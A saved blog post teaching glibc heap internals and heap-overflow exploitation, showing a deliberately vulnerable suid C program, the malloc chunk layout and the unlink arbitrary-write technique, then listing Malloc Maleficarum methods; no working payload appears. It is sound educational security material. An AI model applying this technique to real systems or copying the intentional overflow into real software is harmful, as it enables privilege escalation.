<div id="navbar-iframe-container"><iframe frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="" tabindex="0" vspace="0" width="100%" id="navbar-iframe" name="navbar-iframe" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/navbar.html"></iframe></div>
<script type="text/javascript" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/plusone.js" gapi_processed="true"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d3500917063499850097\x26blogName\x3dMathy+Vanhoef\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dBLUE\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttp://www.mathyvanhoef.com/search\x26blogLocale\x3den_GB\x26v\x3d2\x26homepageUrl\x3dhttp://www.mathyvanhoef.com/\x26targetPostID\x3d1709971016142527507\x26blogPostOrPageUrl\x3dhttp://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html\x26vt\x3d-7572943856028700337',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe"
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header"><div class="widget Header" data-version="1" id="Header1">
<div id="header-inner">
<div class="titlewrapper">
<h1 class="title">
<a href="http://www.mathyvanhoef.com/">Mathy Vanhoef</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>PhD Student Computer Security @KULeuven</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol"><div class="widget PageList" data-version="1" id="PageList1">
<h2>Pages</h2>
<div class="widget-content">
<ul>
<li><a href="http://www.mathyvanhoef.com/">Home</a></li>
<li><a href="http://www.mathyvanhoef.com/p/publications.html">Publications</a></li>
<li><a href="http://www.mathyvanhoef.com/p/tools.html">Tools</a></li>
<li><a href="http://www.mathyvanhoef.com/p/about.html">About</a></li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=PageList&amp;widgetId=PageList1&amp;action=editWidget&amp;sectionId=crosscol" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;PageList1&quot;));" target="configPageList1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div></div>
<div class="tabs no-items section" id="crosscol-overflow"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
 
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main"><div class="widget Blog" data-version="1" id="Blog1">
<div class="blog-posts hfeed">
<div class="date-outer">
<h2 class="date-header"><span>Friday, 8 February 2013</span></h2>
<div class="date-posts">
<div class="post-outer">
<div class="post hentry">
<a name="1709971016142527507"></a>
<h3 class="post-title entry-title">
Understanding the Heap &amp; Exploiting Heap Overflows
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-1709971016142527507">
This post will begin with a high level description of the heap and slowly builds up untill you able to write your own heap-based exploits. We assume we have non-root access to a computer but are able to run the following program as root (meaning it's a <a href="https://en.wikipedia.org/wiki/Setuid">suid binary</a>):<br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4514830.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4514830" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-heapsploit1-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-heapsploit1-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-heapsploit1-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-heapsploit1-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-heapsploit1-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-heapsploit1-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-heapsploit1-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> *argv[])</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-heapsploit1-c-LC6" class="blob-code blob-code-inner js-file-line">{</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-heapsploit1-c-LC7" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">char</span> *buf1 = <span class="pl-c1">malloc</span>(<span class="pl-c1">128</span>);</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-heapsploit1-c-LC8" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">char</span> *buf2 = <span class="pl-c1">malloc</span>(<span class="pl-c1">256</span>);</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-heapsploit1-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-heapsploit1-c-LC10" class="blob-code blob-code-inner js-file-line">  <span class="pl-c1">read</span>(<span class="pl-c1">fileno</span>(stdin), buf1, <span class="pl-c1">200</span>);</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-heapsploit1-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="file-heapsploit1-c-LC12" class="blob-code blob-code-inner js-file-line">  <span class="pl-c1">free</span>(buf2);</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L13" class="blob-num js-line-number" data-line-number="13"></td>
        <td id="file-heapsploit1-c-LC13" class="blob-code blob-code-inner js-file-line">  <span class="pl-c1">free</span>(buf1);</td>
      </tr>
      <tr>
        <td id="file-heapsploit1-c-L14" class="blob-num js-line-number" data-line-number="14"></td>
        <td id="file-heapsploit1-c-LC14" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4514830/raw/70a75bfcec9c16fb4018fef7deff3c9da934ede6/heapsploit1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4514830#file-heapsploit1-c">heapsploit1.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
There's a blatant buffer overflow in line 10 which we will be exploiting. First we need to know how the heap is managed (we focus on Linux).<br>
<br>
<span style="font-size: large;"><b>Basic Heap and Chunk Layout</b></span><br>
<br>
Every memory allocation a program makes (say by calling malloc) is internally represented by a so called "chunk". A chunk consists of metadata and the memory returned to the program (i.e., the memory actually returned by malloc). All these chunks are saved on the heap, which is a memory region capable of expanding when new memory is requested. Similarly, the heap can shrink once a certain amount of memory has been freed. A chunk is defined in the glibc source as follows:<br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4486489.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4486489" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-malloc-malloc-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-malloc-malloc-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-malloc-malloc-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> malloc_chunk {</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-malloc-malloc-c-LC2" class="blob-code blob-code-inner js-file-line">  INTERNAL_SIZE_T      prev_size;  <span class="pl-c">/* Size of previous chunk (if free).  */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-malloc-malloc-c-LC3" class="blob-code blob-code-inner js-file-line">  INTERNAL_SIZE_T      size;       <span class="pl-c">/* Size in bytes, including overhead. */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-malloc-malloc-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-malloc-malloc-c-LC5" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> malloc_chunk* fd;         <span class="pl-c">/* double links -- used only if free. */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-malloc-malloc-c-LC6" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> malloc_chunk* bk;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-malloc-malloc-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-malloc-malloc-c-LC8" class="blob-code blob-code-inner js-file-line">  <span class="pl-c">/* Only used for large blocks: pointer to next larger size.  */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-malloc-malloc-c-LC9" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> malloc_chunk* fd_nextsize; <span class="pl-c">/* double links -- used only if free. */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-malloc-malloc-c-LC10" class="blob-code blob-code-inner js-file-line">  <span class="pl-k">struct</span> malloc_chunk* bk_nextsize;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-malloc-malloc-c-LC11" class="blob-code blob-code-inner js-file-line">};</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4486489/raw/1b0ab6e7fe6f666700f37e19e0c0adb895a59dd6/malloc%5Cmalloc.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4486489#file-malloc-malloc-c">malloc\malloc.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
Assuming no memory chunks have been freed yet, new memory allocations are always stored right after the last allocated chunk. So if a program were to call malloc(256), malloc(512), and finally malloc(1024), the memory layout of the heap is as follows:<br>
<blockquote class="tr_bq">
<span style="font-family: Courier New, Courier, monospace;">Meta-data of chunk created by malloc(256)</span><br>
<span style="font-family: Courier New, Courier, monospace;">The 256 bytes of memory return by malloc</span><br>
<span style="font-family: Courier New, Courier, monospace;">-----------------------------------------</span><br>
<span style="font-family: Courier New, Courier, monospace;">Meta-data of chunk created by malloc(512)</span><br>
<span style="font-family: Courier New, Courier, monospace;">The 512 bytes of memory return by malloc</span><br>
<span style="font-family: Courier New, Courier, monospace;">-----------------------------------------</span><br>
<span style="font-family: Courier New, Courier, monospace;">Meta-data of chunk created by malloc(1024)</span><br>
<span style="font-family: Courier New, Courier, monospace;">The 1024 bytes of memory return by malloc</span><br>
<span style="font-family: &#39;Courier New&#39;, Courier, monospace;">-----------------------------------------</span><br>
<span style="font-family: &#39;Courier New&#39;, Courier, monospace;">Meta-data of the top chunk</span></blockquote>
The dash line "---" is an imaginary boundary between the chunks, in reality they are placed right next to each other (<a href="https://gist.github.com/4575760">example program illustrating the layout</a>). Anyway, you're probably wondering why I included the meta data of the "top chunk" in the layout. Well, the top chunk represents the remaining available memory on the heap, and it is the only chunk that can grow in size. When a new memory request is made, the top chunk is split into two: the first part becomes the requested chunk, and the second part is the new the top chunk (so the "top chunk" shrunk&nbsp;in size). If the top chunk is not large enough to fulfill the memory allocation, the program <a href="https://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html">asks the operating system</a> to expand the top chunk (making the heap grow in size).<br>
<br>
<span style="font-size: large;"><b>Interpretation of the Chunk Structure</b></span><br>
<br>
The interpretation of the chunk structure depends on the current state of the chunk. For example, the only metadata present in an <b>allocated chunk</b> are the <i>prev_size</i> and&nbsp;<i>size</i>&nbsp;fields. The buffer returned to the program starts at the <i>fd</i> field. This means an allocated chunk always has 8 bytes of metadata, after which the actual buffer starts. Also surprising is that the&nbsp;<i>prev_size</i> field isn't used by allocated chunks! In a minute we will see that an <b>unallocated (free) chunk</b> does use the additional fields.<br>
<br>
Another important observation is that in glibc chunks are always 8-bytes aligned. And to simplify memory management the size of chunks is always a multiple of 8 bytes. This means that the last 3 bits of the <i>size</i> field can be used for other purposes (these 3 bits would always be zero otherwise). Only the first (<a href="https://en.wikipedia.org/wiki/Least_significant_bit">least significant</a>) bit is important for us. If it's set it means that the <b>previous</b> chunk is in use. If it's not set the <b>previous</b> chunk is not in use. A chunk is not in used if the corresponding memory has been freed (by a call to free).<br>
<br>
So how can we check whether the <b>current</b> chunk is in use? Simple really: we navigate to the next chunk by adding <i>size</i> to the pointer of the current chunk, resulting in the location of the next chunk. In this next chunk we read the least significant bit of the <i>size</i> field to see if the chunk is in use.<br>
<br>
<span style="font-size: large;"><b>Managing Free Chunks</b></span><br>
<br>
We know that when a chunk is freed, the least significant bit of the <i>size</i> field in the meta data of the next chunk must be&nbsp;<b>cleared</b>. Additionally, the&nbsp;<i>prev_size</i> field of this next chunk will be set to the size of the chunk we are freeing.<br>
<br>
A freed chunk also uses the <i>fd</i> and <i>bk</i> fields. <b>These are the fields we can abuse in our exploit.</b> The <i>fd</i> field points to the previous free chunk, and the <i>bk</i> field to the next free chunk. This means free chunks are saved in a <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">doubly linked list</a>. However there isn't just one list containing all free chunks. There are actually multiple lists of free chunks. Each list contains free chunks of a specific size. This makes searching for a free chunk of a certain size a lot faster, since it only has to search in the list supporting the particular size. We now need to correct an earlier statement: When a memory allocation request is made, it first searches for a free chunk that has the same size (or a bit larger), and will reuse that memory. Only if no appropriate free chunk was found will the top chunk be used.<br>
<br>
Finally we get to the functionality we will exploit: freeing a chunk. When a chunk is freed (e.g. by a call to <a href="http://linux.die.net/man/3/free">free</a>) it checks whether the chunk before it has already been freed. In case the previous chunk is not in use, it's&nbsp;coalesced with the chunk being freed. However this increases the size of the chunk. As a result the chunk has to be placed in a different list of free chunks. To do this the already freed chunk is first removed from the linked list, and then the coalesced chunk is added to the appropriate list. The code of removing a chunk from a linked list is:<br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4576191.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4576191" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-malloc-malloc-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-malloc-malloc-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-malloc-malloc-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/* Take a chunk off a bin list */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-malloc-malloc-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">unlink</span>(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-malloc-malloc-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-malloc-malloc-c-LC4" class="blob-code blob-code-inner js-file-line">	FD = P-&gt;fd;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-malloc-malloc-c-LC5" class="blob-code blob-code-inner js-file-line">	BK = P-&gt;bk;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-malloc-malloc-c-LC6" class="blob-code blob-code-inner js-file-line">	FD-&gt;bk = BK;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-malloc-malloc-c-LC7" class="blob-code blob-code-inner js-file-line">	BK-&gt;fd = FD;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-malloc-malloc-c-LC8" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4576191/raw/5101e4e22f3f6fdfe27b957a3536475d72c22efd/malloc%5Cmalloc.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4576191#file-malloc-malloc-c">malloc\malloc.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
Here argument P represents the chunk being removed from the list. Arguments BK and FD are output arguments representing the previous and next chunk, respectively. This is very typical code to remove an element from a linked list, and its operation is illustrated below [<a href="http://www.math.ucla.edu/~wittman/10a.1.10w/ccc/ch16/ch16.html">Source</a>]:<br>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
<a href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/linkedlist_small.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/linkedlist_small.png"></a></div>
<br>
Here the element containing "Lam Larry" is being removed from the list. As you can see, to remove an element from a linked list two operators must be performed:<br>
<ol>
<li>The backward (bk) pointer of the next element (FD-&gt;bk) is set to the pointer of the previous element (BK). This corresponds to line 6 of the unlink function.</li>
<li>The forward (fd) pointer of the previous element (BK-&gt;fd) is set to the pointer of the next element (FD). This corresponds to line 7 of the unlink function.</li>
</ol>
From an attacker perspective, the important thing is that <b>two write operations to the memory are performed</b>. The goal is now to manipulate the metadata so that we can <i>control the value being written</i>, and <i>control where it's written</i>. This allows us to <b>write an arbitrary value to an arbitrary location</b>. With this we can overwrite the function pointer of a destructor, and make it point to our own code.<br>
<br>
Note: The article <a href="http://www.phrack.org/issues.html?issue=57&amp;id=8&amp;mode=txt">Vudo malloc tricks</a>&nbsp;[7] also contains a more detailed discussion about how malloc works internally. <br>
<br>
<span style="font-size: large;"><b>More Recent Techniques</b></span><br>
<br>
Unfortunately the technique explained above is no longer possible against newer versions of glibc. The unlink function has been hardened and includes the following runtime check: the forward pointer <i>of the previous chunk</i> must point toward the current chunk. Similarly the previous pointer <i>of the next chunk</i> must also point toward the current chunk:<br>
<br>
<script src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/4703872.js"></script><link rel="stylesheet" href="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/gist-embed-3702b6c62d5a21c09ed7e3135bfd0f3c14faeebf8e6380d852867face9ffb446.css"><div id="gist4703872" class="gist">
    <div class="gist-file">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-malloc-malloc-c" class="file">
    

  <div itemprop="text" class="blob-wrapper data type-c">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tbody><tr>
        <td id="file-malloc-malloc-c-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-malloc-malloc-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/* Take a chunk off a bin list */</span></td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-malloc-malloc-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">unlink</span>(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-malloc-malloc-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-malloc-malloc-c-LC4" class="blob-code blob-code-inner js-file-line">	FD = P-&gt;fd;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-malloc-malloc-c-LC5" class="blob-code blob-code-inner js-file-line">	BK = P-&gt;bk;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-malloc-malloc-c-LC6" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-c1">__builtin_expect</span> (FD-&gt;bk != P || BK-&gt;fd != P, <span class="pl-c1">0</span>))</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-malloc-malloc-c-LC7" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">malloc_printerr</span>(check_action,<span class="pl-s"><span class="pl-pds">"</span>corrupted double-linked list<span class="pl-pds">"</span></span>,P);</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-malloc-malloc-c-LC8" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">else</span> {</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-malloc-malloc-c-LC9" class="blob-code blob-code-inner js-file-line">		FD-&gt;bk = BK;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-malloc-malloc-c-LC10" class="blob-code blob-code-inner js-file-line">		BK-&gt;fd = FD;</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-malloc-malloc-c-LC11" class="blob-code blob-code-inner js-file-line">	}</td>
      </tr>
      <tr>
        <td id="file-malloc-malloc-c-L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="file-malloc-malloc-c-LC12" class="blob-code blob-code-inner js-file-line">}</td>
      </tr>
</tbody></table>

  </div>

  </div>
  
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/vanhoefm/4703872/raw/4f767d269f63ac8b7dd3e21747ed9e16fd2e68a1/malloc%5Cmalloc.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/vanhoefm/4703872#file-malloc-malloc-c">malloc\malloc.c</a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<br>
For the more advanced techniques we will base ourselves on the techniques outlined in the <a href="http://packetstormsecurity.com/files/view/40638/MallocMaleficarum.txt">Malloc Maleficarum</a>&nbsp;[5] and the<a href="http://www.phrack.org/issues.html?issue=66&amp;id=10&amp;mode=txt">&nbsp;Malloc Des-Maleficarum</a>&nbsp;[6]. The author introduced several techniques and gave them rather special names. The requirements of these techniques are:<br>
<ul>
<li><b>The House of Prime</b>: Requires two free's of chunks containing attacker controlled size fields, followed by a call to malloc.</li>
<li><b>The House of Mind</b>: Requires the manipulation of the program into repeatedly allocating new memory.</li>
<li><b>The House of Force</b>: Requires that we can overwrite the top chunk, that there is one malloc call with a user controllable size, and finally requires another call to malloc.</li>
<li><b>The House of Lore</b>: Again not applicable to our example program.</li>
<li><b>The House of Spirit</b>: One assumption is that the attacker controls a pointer given to free, so again this technique cannot be used.</li>
<li><b>The House of Chaos</b>: This isn't actually a technique, just a section in the article :)</li>
</ul>
